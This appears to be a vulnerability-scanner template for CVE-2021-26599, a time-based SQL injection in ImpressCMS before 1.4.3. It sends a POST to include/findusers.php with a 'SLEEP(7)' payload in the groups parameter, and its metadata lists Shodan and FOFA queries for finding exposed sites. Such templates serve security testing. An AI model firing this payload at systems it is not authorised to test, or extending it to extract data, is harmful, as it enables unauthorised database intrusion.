flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: token
    regex:
    - REQUEST' value='(.*)'
    type: regex
  raw:
  - 'GET /misc.php?action=showpopups&type=friend HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - duration>=7
    - status_code==200
    - contains(body, "array(1) {")
    type: dsl
  raw:
  - '@timeout: 30s

    POST /include/findusers.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    user_submit=1&token={{token}}&groups[]=1%20OR%20SLEEP(7)#

    '
id: CVE-2021-26599
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2021-26599
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.881
    epss-score: 0.04018
  description: 'ImpressCMS before 1.4.3 is vulnerable to SQL injection via the groups
    parameter in include/findusers.php, allowing unauthenticated attackers to execute
    arbitrary SQL queries.

    '
  impact: 'Unauthenticated attackers can execute arbitrary SQL queries via SQL injection,
    potentially extracting sensitive database contents or modifying data.

    '
  metadata:
    fofa-query: body="ImpressCMS"
    max-request: 1
    product: impresscms
    shodan-query: http.html:"ImpressCMS"
    vendor: impresscms
  name: ImpressCMS < 1.4.3 - SQL Injection
  reference:
  - https://hackerone.com/reports/1081145
  - http://karmainsecurity.com/KIS-2022-04
  - https://nvd.nist.gov/vuln/detail/CVE-2021-26599
  remediation: 'Update ImpressCMS to version 1.4.3 or later.

    '
  severity: high
  tags: cve,cve2021,impresscms,sqli,time-based-sqli,vuln
